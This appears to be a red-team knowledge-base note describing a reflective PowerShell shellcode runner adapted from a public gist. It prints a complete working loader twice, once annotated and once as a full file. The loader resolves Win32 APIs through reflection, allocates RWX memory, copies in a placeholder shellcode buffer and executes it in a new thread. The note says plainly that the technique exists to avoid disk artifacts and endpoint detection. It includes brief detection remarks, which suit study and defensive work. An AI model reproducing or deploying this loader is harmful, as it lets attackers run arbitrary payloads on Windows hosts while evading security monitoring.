---
aliases:
  - run.ps1
tags:
  - 💣Offensive_Code
primary-categories:
  - "[[Development]]"
  - "[[Penetration Test]]"
  - "[[Red Team]]"
secondary-categories:
  - "[[PowerShell]]"
  - "[[Payload Engineering]]"
type: Offensive Code
languages:
  - PowerShell
entry-points:
  - Shellcode Loader
implements-tradecraft: []
targets-vulnerabilities: []
uses-protocols: []
opsec-risk: High
platforms:
  - Windows
note-status: ☑️ Ready
---
# [[Reflective PowerShell Shellcode Runner]]

---
## Overview

This reflective PowerShell shellcode runner template provides a stealthier alternative to traditional in-memory payload delivery by avoiding the use of disk-backed artifacts. A common method of executing unmanaged code in PowerShell is through the `Add-Type` cmdlet, which compiles and stores .NET assemblies to disk — a behavior that can trigger detection from endpoint monitoring tools. In contrast, this template performs all operations entirely in memory, eliminating the reliance on `Add-Type` and minimizing forensic evidence. This payload template is largely based on `run.ps1` by _braaaax_[^1].

## Purpose

Use this note as a reference for an in-memory PowerShell runner pattern that avoids `Add-Type` and other disk-backed compilation artifacts.

## Implementation Notes

### Entry Points

- The script is intended to run directly inside a PowerShell execution context and expects the operator to replace the placeholder shellcode buffer before execution
- The main path is linear: resolve APIs, build delegates, allocate/copy payload bytes, then start execution in a new thread

### Core Logic

The payload follows a three-step reflective injection process, all without relying on `Add-Type` or writing any assemblies to disk:

#### Dynamic Win32 API Resolution

Using .NET reflection, the script locates function pointers for native Win32 APIs like `VirtualAlloc`, `CreateThread`, and `WaitForSingleObject` by querying loaded modules and calling `GetProcAddress`:

```powershell
# Function to dynamically resolve the address of a Win32 API function in memory
function LookupFunc {
        Param ($moduleName, $functionName)

		# Get the 'UnsafeNativeMethods' type from the loaded System.dll assembly
        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
				    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
				    ).GetType('Microsoft.Win32.UnsafeNativeMethods')
	    
	    $tmp=@()

		# Filter out the 'GetProcAddress' method
	    $assem.GetMethods() | ForEach-Object {
		    If($_.Name -eq "GetProcAddress") {$tmp+=$_}
		}

		# Invoke GetProcAddress(GetModuleHandle($moduleName), $functionName)
        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
```

#### Delegate Construction For API Invocation

Since .NET requires strong typing for API calls, the script uses `System.Reflection.Emit` to define method signatures at runtime. This allows for calling unmanaged APIs using the correct parameter and return types:

```powershell
# Function to dynamically generate a delegate type for a given API function signature
function getDelegateType {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
            [Parameter(Position = 1)] [Type] $delType = [Void]
        )

		# Define a dynamic in-memory assembly to hold the delegate type
        $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
			        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
			        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
			        ).DefineDynamicModule('InMemoryModule', $false).DefineType(
				        'MyDelegateType', 
				        'Class, Public, Sealed, AnsiClass, AutoClass',
				        [System.MulticastDelegate]
				    )

		# Define the constructor required for a delegate type
		$type.DefineConstructor('RTSpecialName, HideBySig, Public',
								[System.Reflection.CallingConventions]::Standard,
								$func).SetImplementationFlags('Runtime, Managed')

		# Define the 'Invoke' method for the delegate (used to call the function)
		$type.DefineMethod('Invoke',
							'Public, HideBySig, NewSlot, Virtual',
							$delType,
							$func).SetImplementationFlags('Runtime, Managed')

		# Create and return the delegate type
        return $type.CreateType()
}
```

#### Allocate Memory, Inject Shellcode, And Invoke Execution

With the shellcode hard coded in a byte array, the script allocates *RWX* memory, copies the payload into it, and creates a new thread to execute it. The entire process is conducted using delegates and Win32 APIs resolved in-memory:

```powershell
# Replace this with actual shellcode bytes
[Byte[]] $buf = <shellcode-buffer-byte-array>

# Allocate memory
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
	(LookupFunc kernel32.dll VirtualAlloc),
	(getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32]) ([IntPtr]))
	).Invoke([IntPtr]::Zero, $buf.length, 0x3000, 0x40)

# Copy shellcode into allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

# Execute shellcode in new thread
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
	(LookupFunc kernel32.dll CreateThread), 
	(getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
	).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

# Wait for thread to complete
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

### Dependencies

- A Windows host with PowerShell and .NET reflection support
- Shellcode generated elsewhere and supplied in a byte-array form
- Defender assumptions that do not fully block reflective API resolution, RWX allocation, or suspicious thread creation

## File Contents

> [!example]- `run.ps1`
> ```powershell
> function LookupFunc {
>         Param ($moduleName, $functionName)
> 
>         $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
> 				    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
> 				    ).GetType('Microsoft.Win32.UnsafeNativeMethods')
> 	    
> 	    $tmp=@()
> 
> 	    $assem.GetMethods() | ForEach-Object {
> 		    If($_.Name -eq "GetProcAddress") {$tmp+=$_}
> 		}
> 
>         return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
> }
> 
> function getDelegateType {
>         Param (
>             [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
>             [Parameter(Position = 1)] [Type] $delType = [Void]
>         )
> 
>         $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
> 			        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
> 			        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
> 			        ).DefineDynamicModule('InMemoryModule', $false).DefineType(
> 				        'MyDelegateType', 
> 				        'Class, Public, Sealed, AnsiClass, AutoClass',
> 				        [System.MulticastDelegate]
> 				    )
> 
> 		$type.DefineConstructor('RTSpecialName, HideBySig, Public',
> 								[System.Reflection.CallingConventions]::Standard,
> 								$func).SetImplementationFlags('Runtime, Managed')
> 
> 		$type.DefineMethod('Invoke',
> 							'Public, HideBySig, NewSlot, Virtual',
> 							$delType,
> 							$func).SetImplementationFlags('Runtime, Managed')
> 
>         return $type.CreateType()
> }
> 
> [Byte[]] $buf = <shellcode-buffer-byte-array>
> 
> $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
> 	(LookupFunc kernel32.dll VirtualAlloc),
> 	(getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32]) ([IntPtr]))
> 	).Invoke([IntPtr]::Zero, $buf.length, 0x3000, 0x40)
> 
> [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
> 
> $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
> 	(LookupFunc kernel32.dll CreateThread), 
> 	(getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
> 	).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
> 
> [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
> ```

## Usage

- Adapt the shellcode buffer to the payload you intend to execute
- Validate the approach in a controlled lab before operational use
- Pair this note with related loader, evasion, or C2 infrastructure notes when building a fuller workflow

## Detection And OPSEC

- The technique reduces some disk-backed artifacts, but it still exposes memory-allocation and thread-creation behavior
- API resolution, RWX allocation, and thread start telemetry may still be visible to defenders

## Analyst Notes

- This note is strongest when paired with defensive observations and reverse-engineering follow-up
- Future iterations could compare this approach against alternative in-memory PowerShell execution methods

---

## Related Notes

### Same Classification

#### Similar Offensive Code
```dataview
LIST
FROM "03 - Content"
WHERE type = "Offensive Code"
  AND (note-status = "☑️ Ready" OR note-status = "Ready" OR !note-status)
  AND file.name != this.file.name
  AND (
    contains(languages, this.languages[0]) OR
    contains(platforms, this.platforms[0])
  )
SORT file.name ASC
LIMIT 10
```

### Typed Relationships

#### Implements Tradecraft
```dataview
LIST
FROM "03 - Content"
WHERE type = "Tradecraft"
  AND (note-status = "☑️ Ready" OR note-status = "Ready" OR !note-status)
  AND contains(this.implements-tradecraft, file.link)
SORT file.name ASC
```

#### Targets Vulnerabilities
```dataview
LIST
FROM "03 - Content"
WHERE type = "Vulnerability"
  AND (note-status = "☑️ Ready" OR note-status = "Ready" OR !note-status)
  AND contains(this.targets-vulnerabilities, file.link)
SORT file.name ASC
```

#### Uses Protocols
```dataview
LIST
FROM "03 - Content"
WHERE type = "Protocol"
  AND (note-status = "☑️ Ready" OR note-status = "Ready" OR !note-status)
  AND contains(this.uses-protocols, file.link)
SORT file.name ASC
```

---

## Resources

| Reference                                                                            | Info                                                                                                   |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| [PEN-300, OffSec](https://www.offsec.com/courses/pen-300/)                           | Course on advanced penetration testing techniques, including reflective PowerShell shellcode execution |
| [run.ps1, braaaax](https://gist.github.com/braaaax/41789bad5d07b8ba236299047a774ffa) | GitHub Gist page for reflective PowerShell payload                                                     |

[^1]: run.ps1, braaaax, https://gist.github.com/braaaax/41789bad5d07b8ba236299047a774ffa

---

*Created Date*: <%+tp.file.creation_date("MMMM Do YYYY (HH:mm a)")%>  
*Last Modified Date*: <%+tp.file.last_modified_date("MMMM Do YYYY (HH:mm a)")%>
